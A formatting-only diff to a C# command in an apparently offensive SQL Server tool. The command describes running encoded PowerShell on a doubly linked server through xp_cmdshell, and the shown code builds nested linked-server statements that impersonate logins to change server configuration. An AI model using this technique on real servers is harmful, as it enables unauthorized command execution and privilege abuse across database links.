@@ -8,15 +8,26 @@ namespace CheeseSQL.Commands
     public class dbllinkedxp : ICommand
     {
         public static string CommandName => "dbllinkedxp";
-        
-        public string Description() {
+
+        public string Description()
+        {
             return $"[*] {CommandName}\r\n" +
-                $"  Description: Execute Encoded PowerShell Command on Doubly Linked SQL Server via 'xp_cmdshell'";
+                   $"  Description: Execute Encoded PowerShell Command on Doubly Linked SQL Server via 'xp_cmdshell'";
         }
 
-        public string Usage() {
+        public string Usage()
+        {
             return $"{Description()}\r\n  " +
-                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE [/impersonate:USER] [/impersonate-intermediate:USER] [/impersonate-linked:USER] /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
+                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
+                $"/db:DATABASE " +
+                $"/server:SERVER " +
+                $"/intermediate:INTERMEDIATE " +
+                $"/target:TARGET " +
+                $"/command:COMMAND " +
+                $"[/impersonate:USER] " +
+                $"[/impersonate-intermediate:USER] " +
+                $"[/impersonate-linked:USER] " +
+                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
         }
 
         public void Execute(Dictionary<string, string> arguments)
@@ -142,10 +153,13 @@ namespace CheeseSQL.Commands
             if (!String.IsNullOrEmpty(impersonate_linked) && !String.IsNullOrEmpty(impersonate_intermediate))
             {
                 enableAdvOptions = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
-            } else if (!String.IsNullOrEmpty(impersonate_linked)) {
+            }
+            else if (!String.IsNullOrEmpty(impersonate_linked))
+            {
                 enableAdvOptions = $"EXEC ('EXEC (''EXECUTE AS LOGIN = ''''{impersonate_linked}'''' EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
             }
-            else if(!String.IsNullOrEmpty(impersonate_intermediate)) {
+            else if (!String.IsNullOrEmpty(impersonate_intermediate))
+            {
                 enableAdvOptions = $"EXEC ('EXECUTE AS LOGIN = ''{impersonate_intermediate}'' EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{target}]') AT [{intermediate}]";
             }
 
